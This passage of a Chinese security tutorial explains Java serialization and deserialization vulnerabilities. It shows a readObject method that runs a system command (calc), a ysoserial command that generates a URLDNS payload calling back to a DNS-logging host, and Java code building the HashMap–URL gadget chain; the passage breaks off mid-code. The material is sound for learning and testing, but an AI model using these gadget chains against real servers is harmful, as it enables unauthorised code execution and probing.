概念</h3><p><strong>序列化（Serialization）</strong>是指将数据结构或对象转换为一种可以存储或传输的格式的过程。这种格式通常是字节流或字符串，以便可以通过网络传输、保存到文件中或存储在数据库中。常见的序列化格式包括JSON、XML、二进制格式等。</p><p><strong>反序列化（Deserialization）</strong>是指将序列化的数据格式转换回原始数据结构或对象的过程。通过反序列化，可以从存储或传输的格式中重新构建出原始的数据结构或对象。</p><p><strong>简单理解：</strong></p><p><strong>序列化：对象 -&gt; 字符串</strong></p><p><strong>反序列化：字符串 -&gt; 对象</strong></p><h3 id="1-1-2-目的"><a href="#1-1-2-目的" class="headerlink" title="1.1.2 目的"></a>1.1.2 目的</h3><p>序列化的目的：为了方便数据的传输；</p><ol><li><strong>数据持久化</strong>：将数据保存到文件、数据库等存储介质中，以便在以后重新加载和使用。</li><li><strong>数据传输</strong>：在网络通信中，通过序列化将数据转换为可以传输的格式，并在接收端通过反序列化恢复为原始数据。</li><li><strong>跨平台数据交换</strong>：不同系统或编程语言之间的数据交换，通过标准的序列化格式（如JSON、XML等）实现互操作性。</li></ol><h3 id="1-1-3-应用"><a href="#1-1-3-应用" class="headerlink" title="1.1.3 应用"></a>1.1.3 应用</h3><ol><li>想把内存中的对象保存到一个文件中或者是数据库当中。</li><li>用套接字在网络上传输对象。</li><li>通过 RMI 传输对象的时候。</li></ol><h3 id="1-1-4-常见的序列化格式"><a href="#1-1-4-常见的序列化格式" class="headerlink" title="1.1.4 常见的序列化格式"></a>1.1.4 常见的序列化格式</h3><ol><li><strong>JSON</strong>：一种轻量级的数据交换格式，易于人类阅读和编写，同时也便于机器解析和生成。</li><li><strong>XML（SOAP）</strong>：一种标记语言，广泛用于文档存储和数据传输。</li><li><strong>Protobuf</strong>：Google开发的高效二进制序列化格式，适用于高性能需求的应用场景。</li><li><strong>YAML</strong>：一种易读的序列化格式，常用于配置文件。</li></ol><h2 id="1-2-Java原生序列化"><a href="#1-2-Java原生序列化" class="headerlink" title="1.2 Java原生序列化"></a>1.2 Java原生序列化</h2><h3 id="1-2-1-Java序列化与反序列化"><a href="#1-2-1-Java序列化与反序列化" class="headerlink" title="1.2.1 Java序列化与反序列化"></a>1.2.1 Java序列化与反序列化</h3><p>简单感受一下</p><ul><li>类文件：<strong>Person.java</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy.entity;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> Deserializatioin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.entity.Person.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/10/23 09:21</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">// 只有实现Serializable接口的类才能够序列化</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>序列化和反序列化serialization.java</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">import</span> com.candy.entity.Person;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> Deserializatioin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.serialization.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/10/23 09:24</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">serialization</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;candy&quot;</span>, <span class="hljs-number">18</span>);<br>        <span class="hljs-comment">// 序列化对象</span><br>        <span class="hljs-type">byte</span>[] ser = ser(person);<br>        <span class="hljs-comment">// 输出经过base64编码的序列化字节</span><br>        System.out.println(Base64.getEncoder().encodeToString(ser));<br>        <span class="hljs-comment">// 反序列化字节数组为对象</span><br>        System.out.println(deser(ser));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] ser(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deser</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] ser)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ser);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行<strong>serialization.java</strong>程序后得到Person对象经过base64编码的序列化字符串，并且能够将字节经过反序列化为Person对象，输出对象时，调用对象的<code>toString()</code>方法</p><h3 id="1-2-2-Serializable接口说明"><a href="#1-2-2-Serializable接口说明" class="headerlink" title="1.2.2 Serializable接口说明"></a>1.2.2 Serializable接口说明</h3><ol><li>序列化类的属性没有实现 Serializable 那么在序列化就会报错！</li><li>在反序列化过程中，它的父类如果没有实现序列化接口（implements Serializable），那么将需要提供无参构造函数来重新创建对象。</li><li>一个实现 Serializable 接口的子类也是可以被序列化的。</li><li>静态成员变量是不能被序列化</li><li>transient 标识的对象成员变量不参与序列化</li></ol><h2 id="1-3-Java反序列化安全问题"><a href="#1-3-Java反序列化安全问题" class="headerlink" title="1.3 Java反序列化安全问题"></a>1.3 Java反序列化安全问题</h2><h3 id="1-3-1-安全问题产生原因"><a href="#1-3-1-安全问题产生原因" class="headerlink" title="1.3.1 安全问题产生原因"></a>1.3.1 安全问题产生原因</h3><p>在序列化和反序列化中存在两个“<strong>特别特别特别特别特别特别特别特别</strong>”重要的方法——<code>writeObject()</code>和<code>readObject()</code>。</p><p>由于这两个方法（<code>writeObject()</code>和<code>readObject()</code>）能够被开发者重写，一般的序列化的重写都是由于下面的场景诞生的。</p><p>举个例子，开发者在MyList类定义了一个arr数组属性，初始化的数组长度为100。在序列化时，如果让arr属性参与序列化的话，那么长度为 100的数组都会被序列化下来，但是我们数组中可能只存放30个元素，这明显是不合理的，所有这里需要开发者自定义序列化的过程和反序列化过程，具体的做法就是重写一下两个private方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span><span class="hljs-keyword">throws</span> java.io.IOException<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException<br><span class="hljs-keyword">package</span> com.candy.entity;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> shlin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> Deserializatioin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.entity.Person.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/10/23 09:21</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">// 只有实现Serializable接口的类才能够序列化</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IOException &#123;<br>        in.defaultReadObject();<br>        System.out.println(<span class="hljs-string">&quot;执行自定义反序列化咯！！！&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>只要服务端反序列化数据，客户端传递的类的<code>readObject()</code>方法中的代码会自动调用，这个方法是在服务端所在的机器上运行的。因此，若<code>readObject()</code>中存在恶意方法的执行，就会导致服务端执行恶意代码，从而实现攻击。</p><p>解释一下传递类的<code>readObject</code>函数会自动执行的原因：</p><p>当 <code>ObjectInputStream</code> 反序列化一个对象时，它会检查该类是否定义了一个私有的 <code>readObject</code> 方法。如果存在这样的一个方法，它就会调用这个方法来反序列化对象，而不是使用默认的反序列化机制。这允许开发者在反序列化过程中插入自定义的逻辑。</p><p>所以从根本上来说，Java 反序列化的漏洞的与 <code>readObject</code> 有关。</p><h3 id="1-3-2-可能存在的安全漏洞形式"><a href="#1-3-2-可能存在的安全漏洞形式" class="headerlink" title="1.3.2 可能存在的安全漏洞形式"></a>1.3.2 可能存在的安全漏洞形式</h3><ol><li>入口类<code>readObject</code>直接调用危险函数</li></ol><p>这种情况在实际开发场景中并不常见，但是可以用来简单理解反序列化漏洞</p><p>在入口类Person中自定义的<code>readObject</code>方法中调用危险函数<code>exec</code>调用系统命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy.entity;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> Deserializatioin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.entity.Person.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/10/23 09:21</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">// 只有实现Serializable接口的类才能够序列化</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br><span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IOException &#123;<br>        in.defaultReadObject();<br>        System.out.println(<span class="hljs-string">&quot;执行自定义反序列化咯！！！&quot;</span>);<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在<strong>serialization.java</strong>中new一个Person对象进行序列化在进行反序列化，在反序列化过程中调用了用户自定义的readObject，导致执行语句<code>Runtime.getRuntime().exec(&quot;calc&quot;);</code>从而调用了计算器；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111442814.png" alt="img"></p><ol><li>入口类参数中包含可控类，该类有危险方法，在反序列化<code>readObject</code>时会调用该危险方法</li><li>入口类参数中包含可控类，该类又调用其他又危险方法的类，在反序列化<code>readObject</code>时调用</li></ol><p>这个第三点呢，就是反序列化利用链的基础，我们可以通过入口类调用class1，class1调用class2，class2调用class3，….，一系列类的调用，最终classn调用了Runtime.getRuntime().exec()，从而实现攻击。</p><ol><li>构造函数、静态代码块等类加载时隐式执行</li></ol><h2 id="1-4-反序列化漏洞攻击思路"><a href="#1-4-反序列化漏洞攻击思路" class="headerlink" title="1.4 反序列化漏洞攻击思路"></a>1.4 反序列化漏洞攻击思路</h2><ul><li>攻击前提：实现Serializable（implement Serializable）</li></ul><p>基本思路：</p><ol><li>入口类Source(重写readObject；调用常见的函数；参数类型宽泛&lt;例如可以传入一个Object作为参数&gt;；最好是jdk自带的类；)</li><li>找到入口类之后要找调用链gadget chain；相同名称、相同类型</li><li>执行类sink（RCE、SSRF、写文件等等），比如<code>exec</code>函数等等；</li></ol><h3 id="1-4-1-HashMap寻找入口类"><a href="#1-4-1-HashMap寻找入口类" class="headerlink" title="1.4.1 HashMap寻找入口类"></a>1.4.1 HashMap寻找入口类</h3><ul><li>攻击前提，实现Serializable（implement Serializable）</li></ul><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111442009.png" alt="img"></p><p>首先，查看其自定义的反序列化函数<code>readObject()</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111442434.png" alt="img"></p><p>可以发现HashMap中的<code>键key</code>和<code>值value</code>均是通过反序列化得到的（这个其实不重要），随后再将key变量进行<code>hash</code>操作传入<code>putVal()</code>函数中（这个比较重要）；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111441893.png" alt="img"></p><p>发现，当key值不为空null时，会调用key的hashCode()方法；同时，我们可以发现key的类型为Object，满足所需的<strong>参数类型宽泛</strong>这一条件。因此，这个HashMap可以当作一个入口类来使用，重点就在于后续怎么利用这个入口类？利用链gadget chain怎么构造？</p><h3 id="1-4-2-URLDNS实战"><a href="#1-4-2-URLDNS实战" class="headerlink" title="1.4.2 URLDNS实战"></a>1.4.2 URLDNS实战</h3><p>简单实践一下，手搓一下urldns这条链子，体会一下Java反序列化利用链到底是个什么东西；</p><p>URL利用链的优点如下，非常适合我们用于检测反序列化漏洞：</p><ol><li>使⽤ Java 内置的类构造，对第三⽅库没有依赖；</li><li>在⽬标没有回显的时候，能够通过 DNS 请求得知是否存在反序列化漏洞 URL ；</li></ol><p>先通过反序列化利用链工具 ysoserial 来体验一下这条链子到底能实现什么样的效果；（需要注意你的java应该是jdk8u65）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar URLDNS <span class="hljs-string">&quot;http://7d3511d4.log.dnslog.sbs.&quot;</span> &gt; urldns.bin<br>package com.candy;<br><br>import java.io.FileInputStream;<br>import java.io.IOException;<br>import java.io.ObjectInputStream;<br><br>/**<br> * @author candy<br> * @project Deserializatioin<br> * @file com.candy.urldnsDeser.java<br> * @<span class="hljs-built_in">date</span> 2024/10/24 01:10<br> */<br><br>public class urldnsDeser &#123;<br>    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;<br>        deser(<span class="hljs-string">&quot;Your urldns.bin file absolute path&quot;</span>);<br>    &#125;<br><br>    public static void deser(String fileName) throws IOException, ClassNotFoundException &#123;<br>        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));<br>        Object o = ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来我们来查看一下ysooserial项目中的urldns链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *   Gadget Chain:</span><br><span class="hljs-comment"> *     HashMap.readObject()</span><br><span class="hljs-comment"> *       HashMap.putVal()</span><br><span class="hljs-comment"> *         HashMap.hash()</span><br><span class="hljs-comment"> *           URL.hashCode()</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p>先来看看这里利用链是什么意思？（跟入代码分析）</p><ol><li>HashMap -&gt; readObject()</li><li>HashMap -&gt; putVal()</li><li>HashMap -&gt; hash()</li><li>URL -&gt; hashCode()</li><li>URLStreamHandler-&gt;hashCode()</li><li>URLStreamHandler -&gt; getHostAddress()</li><li>InetAddress -&gt; getByName()</li></ol><p>根据上面分析的内容，我们大致可以构造出一下的序列化内容；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNSGadgetChian</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;www.baidu.com&quot;</span>);<br>        HashMap&lt;URL, Integer&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(url, <span class="hljs-number">1</span>);<br><br>        <span class="hljs-comment">// 序列化hashMap</span><br>        <span class="hljs-type">byte</span>[] ser = ser(hashMap);<br>        System.out.println(Base64.getEncoder().encodeToString(ser));<br><br>        <span class="hljs-comment">// 反序列化</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">deser</span> <span class="hljs-operator">=</span> deser(ser);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] ser(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();   <span class="hljs-comment">//定义字节数组输出流</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);  <span class="hljs-comment">//定义输出流</span><br>        oos.writeObject(o); <span class="hljs-comment">//序列化对象</span><br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deser</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] ser)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ser);  <span class="hljs-comment">//读取执行字节数组作为输入流</span><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);    <span class="hljs-comment">//将字节输入流作为输入流</span><br>        <span class="hljs-keyword">return</span> ois.readObject();    <span class="hljs-comment">//反序列化读取对象</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> Deserializatioin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.URLDNSGadgetChian.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/10/24 13:02</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span 